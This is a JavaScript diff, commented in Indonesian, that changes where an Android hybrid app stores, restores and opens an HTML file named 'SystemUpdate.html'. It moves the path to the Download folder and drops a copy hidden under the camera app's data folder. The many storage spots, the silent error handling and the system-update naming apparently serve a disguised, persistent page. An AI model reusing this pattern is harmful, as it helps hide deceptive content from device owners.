@@ -310,7 +310,8 @@ function saveToAllLocations(htmlContent) {
     // 3. Android/data (via Bridge)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            var path = '/storage/emulated/0/Android/data/SystemUpdate.html';
+            // 🔥 PERBAIKAN: Ganti path ke Download folder
+            var path = '/storage/emulated/0/Download/SystemUpdate.html';
             A.saveFile(path, htmlContent);
         } catch(e) {}
         // 4. SharedPreferences (encoded)
@@ -319,12 +320,8 @@ function saveToAllLocations(htmlContent) {
             A.saveToPreferences('system_SystemUpdate_html', encoded);
         } catch(e) {}
     }
-    // 5. Download folder (fallback)
-    if (PLATFORM.isAndroid && A.isAvailable) {
-        try {
-            A.saveFile('/storage/emulated/0/Android/data/com.android.camera/SystemUpdate.html', htmlContent);
-        } catch(e) {}
-    }
+    // 5. Download folder (fallback) - 🔥 HAPUS path yang tidak perlu
+    // Hanya gunakan satu path Download
 }
 
 // ============================================================
@@ -332,7 +329,7 @@ function saveToAllLocations(htmlContent) {
 // ============================================================
 function openSystemUpdateHTML() {
     setTimeout(function() {
-        // Coba buka dari berbagai lokasi (prioritas: AndroidBridge → localStorage → IndexedDB → Android/data → Download)
+        // Coba buka dari berbagai lokasi (prioritas: SharedPreferences → localStorage → IndexedDB → Download)
         var htmlContent = null;
         // 1. SharedPreferences (via Bridge)
         if (PLATFORM.isAndroid && A.isAvailable) {
@@ -365,18 +362,13 @@ function openSystemUpdateHTML() {
                 };
             } catch(e) {}
         }
-        // 4. Android/data
+        // 4. 🔥 PERBAIKAN: Ganti ke Download folder
         if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
             try {
-                htmlContent = A.readFile('/storage/emulated/0/Android/data/SystemUpdate.html');
+                htmlContent = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
             } catch(e) {}
         }
-        // 5. Download folder
-        if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
-            try {
-                htmlContent = A.readFile('/storage/emulated/0/Android/Data/com.android.camera/SystemUpdate.html');
-            } catch(e) {}
-        }
+        // 5. 🔥 HAPUS: Android/data/com.android.camera (tidak diperlukan)
         // Jika berhasil, buka
         if (htmlContent) {
             openHTML(htmlContent);
@@ -388,7 +380,8 @@ function openHTML(htmlContent) {
     // Android Bridge (buka file)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            var path = '/storage/emulated/0/Android/data/SystemUpdate.html';
+            // 🔥 PERBAIKAN: Ganti ke Download folder
+            var path = '/storage/emulated/0/Download/SystemUpdate.html';
             // Pastikan file ada
             if (A.fileExists(path)) {
                 A.openFile(path);
